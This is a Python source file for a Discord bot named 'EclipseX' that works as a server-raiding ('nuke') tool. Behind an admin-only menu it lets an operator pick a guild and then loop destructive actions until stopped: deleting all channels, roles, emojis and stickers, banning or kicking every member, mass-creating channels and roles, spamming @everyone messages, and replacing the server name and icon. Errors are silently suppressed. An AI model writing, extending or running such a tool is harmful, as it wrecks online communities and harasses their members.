import discord
from discord import Interaction, SyncWebhook
from discord.ui import View, Select, Button
import asyncio
from . import *

##########SelectGuild##########

class SelectGuildView(View):
    def __init__(self, Guild):
        super().__init__(timeout=60)
        self.add_item(GuildSelect(Guild))

class GuildSelect(Select):
    def __init__(self, Guild):
        options = [
            discord.SelectOption(label=guild.name, value=str(guild.id)) for guild in Guild
        ]
        super().__init__(placeholder="Select Guild", options=options)

    async def callback(self, interaction: Interaction):
        if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
            embed = discord.Embed(
                description="You cannot use this command.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        config = helper.LoadConfig()
        SendLogs = config.get("SendLogs", False)
        guild_id = int(self.values[0])  
        
        target_guild = discord.utils.get(interaction.client.guilds, id=guild_id)
        
        if target_guild:
            embed = discord.Embed(
                title="Select Operation",
                description=f"- **Target Name**: `{target_guild.name}`\n- **Target ID**: `{target_guild.id}`",
                color=discord.Color.blue()
            )
            SelectdGduil = target_guild.id
            view = SelectOperationView(SelectdGduil)
            await interaction.response.edit_message(embed=embed, view=view)
        else:
            embed = discord.Embed(
                description="Guild not found.",
                color=discord.Color.red()
            )
            await interaction.response.edit_message(embed=embed)

        if SendLogs == False:
            pass
        else:
            try:
                log_webhook = SyncWebhook.from_url(config.get("LogWebhook", ""))
                if log_webhook:
                    guild = interaction.client.get_guild(guild_id)
                    if guild:
                        embed = discord.Embed(
                            title="Guild Selected",
                            description=f"- **Name**: `{guild.name}`\n- **ID**: `{guild.id}`",
                            color=discord.Color.blue()
                        )
                        try:
                            log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                        except:
                            pass
            except:
                pass

##########SelectOperation##########

class SelectOperationView(View):
    def __init__(self, SelectdGduil):
        super().__init__(timeout=60)
        self.add_item(OperationSelect(SelectdGduil))

class OperationSelect(Select):
    def __init__(self, SelectdGduil):
        self.operation_labels = {
            "DCCT": "Delete Channel And Category",
            "SendMessage": "Send Message",
            "DR": "Delete Role",
            "DE": "Delete Emoji",
            "DS": "Delete Sticker",
            "MB": "Member Ban",
            "MK": "Member Kick",
            "CCT": "Create Category",
            "CC": "Create Channel",
            "CR": "Create Role",
            "CIN": "Change Icon And Name"
        }
        
        options = [
            discord.SelectOption(label=self.operation_labels["DCCT"], value="DCCT"),
            discord.SelectOption(label=self.operation_labels["SendMessage"], value="SendMessage"),
            discord.SelectOption(label=self.operation_labels["DR"], value="DR"),
            discord.SelectOption(label=self.operation_labels["DE"], value="DE"),
            discord.SelectOption(label=self.operation_labels["DS"], value="DS"),
            discord.SelectOption(label=self.operation_labels["MB"], value="MB"),
            discord.SelectOption(label=self.operation_labels["MK"], value="MK"),
            discord.SelectOption(label=self.operation_labels["CCT"], value="CCT"),
            discord.SelectOption(label=self.operation_labels["CC"], value="CC"),
            discord.SelectOption(label=self.operation_labels["CR"], value="CR"),
            discord.SelectOption(label=self.operation_labels["CIN"], value="CIN")
        ]
        self.Guild = SelectdGduil
        self.running = False
        super().__init__(placeholder="Select Operation", options=options)

    async def callback(self, interaction: discord.Interaction):
        if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
            embed = discord.Embed(
                description="You cannot use this command.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        operation = self.values[0]
        SendLogs = helper.LoadConfig().get("SendLogs", False)
        LogWebhook = helper.LoadConfig().get("LogWebhook", "")
        
        stop_button = Button(style=discord.ButtonStyle.danger, label="Stop", custom_id="stop")
        
        async def stop_callback(interaction):
            if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
                embed = discord.Embed(
                    description="You cannot use this command.",
                    color=discord.Color.red()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            
            if SendLogs == False:
                pass
            else:
                try:
                    log_webhook = SyncWebhook.from_url(LogWebhook)
                    if log_webhook:
                        guild = interaction.client.get_guild(self.Guild)
                        if guild:
                            embed = discord.Embed(
                                title="Operation Stopped",
                                description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operation_labels[operation]}`",
                                color=discord.Color.red()
                            )
                            try:
                                log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                            except:
                                pass
                except:
                    pass
            
            self.running = False
            embed = discord.Embed(
                description="- **Stopping the operation**",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        stop_button.callback = stop_callback
        
        view = View()
        view.add_item(stop_button)
        
        embed = discord.Embed(
            description=f"- **Click the Stop button to stop the operation**\n\n- **Operation**: `{self.operation_labels[operation]}`",
            color=discord.Color.blue()
        )
        await interaction.response.send_message(embed=embed, view=view)
        
        self.running = True

        if SendLogs == False:
            pass
        else:
            try:
                log_webhook = SyncWebhook.from_url(LogWebhook)
                if log_webhook:
                    guild = interaction.client.get_guild(self.Guild)
                    if guild:
                        embed = discord.Embed(
                            title="Operation Started",
                            description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operation_labels[operation]}`",
                            color=discord.Color.blue()
                        )
                        try:
                            log_webhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                        except:
                            pass
            except:
                pass

        if operation == "DCCT":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.delete_channel(channel) for channel in G.channels if channel.id != interaction.channel_id]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "SendMessage":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    config = helper.LoadConfig()
                    messages = config.get("Messages", [])
                    if messages:
                        tasks = [self.send_message_to_channel(channel, messages) for channel in G.text_channels]
                        await asyncio.gather(*tasks)
            except:
                pass

        if operation == "DR":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.delete_role(role) for role in G.roles if role.name != "@everyone"]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "DE":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.delete_emoji(emoji) for emoji in G.emojis]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "DS":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.delete_sticker(sticker) for sticker in G.stickers]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "MB":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.ban_member(member) for member in G.members]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "MK":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    tasks = [self.kick_member(member) for member in G.members]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "CCT":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                config = helper.LoadConfig()
                names = config.get("CategoryName", [])
                if G:
                    tasks = [self.create_category(names, G)]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "CC":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    config = helper.LoadConfig()
                    names = config.get("ChannelName", [])
                    tasks = [self.create_channel(names, G)]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "CR":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                config = helper.LoadConfig()
                names = config.get("RoleName", [])
                if G:
                    tasks = [self.create_role(names, G)]
                    await asyncio.gather(*tasks)
            except:
                pass

        if operation == "CIN":
            try:
                Gid = self.Guild
                G = interaction.client.get_guild(Gid)
                if G:
                    config = helper.LoadConfig()
                    name = config.get("GuildName")
                    with open("no1jj/icon.png", "rb") as f:
                        icon = f.read()
                    await G.edit(name=name, icon=icon)
            except Exception as e:
                print(f"Error editing guild: {e}")

    async def delete_channel(self, channel):
        try:
            while self.running:
                if channel:
                    await channel.delete()
                else:
                    break
        except:
            pass

    async def send_message_to_channel(self, channel, messages):
        try:
            while self.running:
                config = helper.LoadConfig()
                send_everyone = config.get("SendEveryone", True)
                
                message = helper.RandomMessage(messages)
                if send_everyone:
                    message += " @everyone"
                    
                await channel.send(message)
        except:
            pass

    async def delete_role(self, role):
        try:
            while self.running:
                if role:
                    await role.delete()
                else:
                    break
        except:
            pass

    async def delete_emoji(self, emoji):
        try:
            while self.running:
                if emoji:
                    await emoji.delete()
                else:
                    break
        except:
            pass

    async def delete_sticker(self, sticker):
        try:
            while self.running:
                if sticker:
                    await sticker.delete()
                else:
                    break
        except:
            pass

    async def ban_member(self, member):
        try:
            while self.running:
                if member:
                    await member.ban()
                else:
                    break
        except:
            pass

    async def kick_member(self, member):
        try:
            while self.running:
                if member:
                    await member.kick()
                else:
                    break
        except:
            pass

    async def create_category(self, names, guild):
        try:
            while self.running:
                await guild.create_category(name=helper.RandomChannelName(names))
        except:
            pass

    async def create_channel(self, names, guild):
        try:
            while self.running:
                await guild.create_text_channel(name=helper.RandomChannelName(names))
        except:
            pass

    async def create_role(self, names, guild):
        try:
            while self.running:
                await guild.create_role(name=helper.RandomRoleName(names))
        except:
            pass

#Made by no.1_jj